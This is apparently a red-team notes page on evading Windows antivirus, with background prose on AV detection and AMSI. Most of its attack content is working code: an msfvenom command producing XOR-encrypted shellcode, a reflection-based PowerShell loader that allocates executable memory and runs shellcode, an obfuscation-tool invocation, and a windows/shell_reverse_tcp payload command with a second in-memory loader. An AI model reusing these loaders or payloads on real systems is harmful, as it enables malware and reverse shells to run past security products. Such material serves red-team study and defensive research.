
## Step 1 Msfvenom Shellcode Encrpytion
```bash
msfvenom -p windows/x64/messagebox text=redteamplaybook title=rtp exitfunc=thread --encrypt xor --encrypt-key redteamplaybook -f ps1 

$buf = 0x8e,0x2d,0xe5,0x90,0x95,0x9e,0x92,0x8f,0x84,0xb1,0x79,0x62,0x6f,0x2e,0x3a,0x33,0x35,0x36,0x25,0x33,0x29,0x5c,0xa2,0x9,0x29,0xf2,0x30,0xf,0x51,0x23,0xf9,0x37,0x7c,0x4a,0x2d,0xea,0x3f,0x50,0x52,0x29,0xf2,0x10,0x3f,0x51,0x23,0x7d,0xd2,0x2e,0x3e,0x28,0x50,0xa4,0x38,0x5d,0xa1,0xd5,0x5e,0xe,0x13,0x69,0x5e,0x45,0x25,0xb5,0xac,0x6c,0x2c,0x71,0xad,0x83,0x94,0x30,0x2e,0x3e,0x55,0x3a,0xee,0x36,0x54,0x5b,0xea,0x2f,0x4c,0x24,0x60,0xa9,0x5c,0xe4,0xef,0xe3,0x72,0x65,0x64,0x3c,0xe0,0xa1,0x19,0x1f,0x24,0x60,0xa9,0x32,0x51,0xe4,0x23,0x6a,0x5b,0x20,0xff,0x25,0x41,0x24,0x71,0xbc,0x82,0x25,0x2a,0x90,0xa6,0x55,0x33,0xee,0x50,0xfc,0x2d,0x60,0xbb,0x3d,0x5d,0xa8,0x31,0x53,0xaf,0xc3,0x2a,0xb3,0xac,0x69,0x35,0x64,0xa0,0x55,0x90,0x19,0x90,0x47,0x2e,0x6c,0x23,0x4f,0x7a,0x20,0x5d,0xa5,0x10,0xb7,0x35,0x4e,0x28,0xea,0x39,0x46,0x26,0x6e,0xbb,0x14,0x5b,0x25,0xff,0x69,0x29,0x53,0x34,0xe7,0x21,0x65,0x2b,0x6e,0xbf,0x55,0x33,0xee,0x60,0xfc,0x2d,0x60,0xbd,0x31,0x34,0x20,0x21,0x3c,0x36,0x35,0x2a,0x2a,0x24,0x3d,0x35,0x3f,0x29,0xee,0x9c,0x4c,0x20,0x2b,0x9d,0x8f,0x37,0x2a,0x2b,0x3f,0x5a,0x3c,0xee,0x73,0x84,0x39,0x93,0x9e,0x86,0x3f,0x26,0xa8,0xaa,0x72,0x65,0x64,0x74,0x5b,0x29,0xe0,0xe5,0x76,0x60,0x79,0x62,0x51,0x23,0xe6,0xf7,0x4f,0x65,0x74,0x65,0x29,0x5c,0xb9,0x2d,0xdb,0x3c,0xe1,0x39,0x68,0x94,0xa7,0xde,0x84,0x69,0x4f,0x6b,0x2c,0xca,0xca,0xf4,0xc4,0xff,0x90,0xba,0x23,0xf1,0xa1,0x4c,0x48,0x63,0x1d,0x67,0xf0,0x97,0x81,0xc,0x67,0xd4,0x28,0x78,0x0,0xa,0xe,0x74,0x3c,0x20,0xe4,0xaa,0x93,0xb4,0xb,0x7,0xb,0x1b,0xe,0x13,0x8,0x14,0x18,0x4,0x18,0xf,0x1f,0x3,0xa,0x79,0x10,0x1b,0x1f,0x6b

```
## Dynamic Method to bypass Add-Type getting Caught 
```bash
function LookUpFunc {
    Param($module, $funcName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $GetProcAddress = $assem.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))

    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($module)))), $funcName))
}

function getDelegateType{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule',$false).DefineType('MyDelegateType','Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime,Managed')
    $type.DefineMethod('Invoke','Public, HideBySig, NewSlot, Virtual',$delType, $func).SetImplementationFlags('Runtime,Managed')
    return $type.CreateType()
}

[Byte[]] $buf =  <Place shell code here>


$pAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookUpFunc Kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $pAlloc, $buf.Length)
$pThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookUpFunc Kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $pAlloc, [IntPtr]::Zero, 0, [IntPtr]::Zero)
```


### Step3 Using Powershell Obfuscation Tools
```bash
pwsh Invoke-Stealth.ps1 test.ps1 -technique all
Loading Chameleon and doing some obfuscation.. [OK]


```

## AMSI BYPASS
AMSI.dll Memory Patching:  Modifying the AMSI.dll file in the computer's memory to disable or alter its functionality temporarily. AMSI.dll 





















## Background
Antivirus (AV) is a vital application designed to proactively prevent, detect, and eradicate malicious software. Originally, its primary purpose was to combat computer viruses, but its capabilities have expanded to address a wide range of digital threats.

## Examples of Antivirus (AV) Software
1. Windows Defender (Microsoft Defender)
2. McAfee Antivirus
3. Norton Antivirus

## Detection Methods
AV software utilizes various sophisticated detection techniques to identify and neutralize threats effectively:

1. Signature-based Detection: This method involves scanning the filesystem for known malware signatures. If any malicious patterns are detected, the AV software takes appropriate actions.

2. Heuristic-based Detection: Employing advanced algorithms and rules, this approach assesses whether specific actions in a program are deemed malicious. It often entails stepping through the instruction set of a binary file, attempting to disassemble the machine code, and ultimately decompiling and analyzing the source code to gain a comprehensive understanding of the program.

3. Behavioral Detection: AV software executes the suspicious file in an emulated environment, such as a small virtual machine, and observes its behaviors or actions. Any actions considered malicious trigger a response from the AV to contain or remove the threat.

4. Machine Learning Detection: By integrating Machine Learning (ML) algorithms, AV software can detect previously unknown threats by collecting and analyzing additional metadata. This approach enhances the AV's ability to stay ahead of emerging threats.

By combining these powerful detection methods, antivirus applications are constantly updated and refined to safeguard computers and users from the ever-evolving landscape of cybersecurity threats.

## In Memory Evasion
In-Memory Injections, also known as PE Injection, is a popular technique used to bypass antivirus products on Windows machines.
## Remote Process Memory Injection
Remote Process Memory Injection,  attempts to inject the payload into another valid PE that is not malicious.
Use `OpenProcess` function to obtain a valid `HANDLE5` to a target process that we have permission to access. After obtaining the `HANDLE`, we would allocate memory in the context of that process by calling a Windows API such as VirtualAllocEx.6 Once the memory has been allocated in the remote process, we would copy the malicious payload to the newly allocated memory using WriteProcessMemory.7 

# Unsuccessful
1. Powershell Invoke-Stealth. (Caught by Windows Defender) https://github.com/JoelGMSec/Invoke-Stealth
  ![](/assets/Project/Invoke.png)

  Techniques that were utilized in the script:
  Techniques:
       · Chameleon: Substitute strings and concatenate variables
       · BetterXencrypt: Compresses and encrypts with random iterations
       · PyFuscation: Obfuscate functions, variables and parameters
       · ReverseB64: Encode with base64 and reverse it to avoid detections
       · PSObfuscation: Convert content to bytes and encode with Gzip
    However, this was blocked in Windows Defender.
  ![](/assets/Project/PowershellFail.png)

2. ScareCrow (Caught by Window Defender) https://github.com/optiv/ScareCrow 
  ![](/assets/Project/scare.png)
  ![](/assets/Project/One.png)
3. Powershell Remote Process memory Injection (Caught by Windows Defender)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
```

```bash
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

```


This was also blocked by Windows Defender.


## AMSI BYPASS 
AMSI (Antimalware Scan Interface) is a Windows feature introduced in Windows 10 and Windows Server 2016. Its primary purpose is to provide an interface that allows antivirus and other security solutions to scan and inspect scripts and code in real-time at runtime

When a script is about to be executed, it passes through AMSI, which scans the script's content for suspicious or malicious behavior. I

AMSI BYPASS METHODS.
Code Fragmentation: Breaking the malicious code into smaller pieces and combining them at runtime to evade detection
Encoding and Obfuscation: Using various encoding and obfuscation techniques to hide the script's true intent from AMSI scanners.
Memory Patching: Modifying the AMSI DLL in memory to disable or alter its functionality temporarily.




## Weaponization

## Reference
- Read team playbook, Offensive Security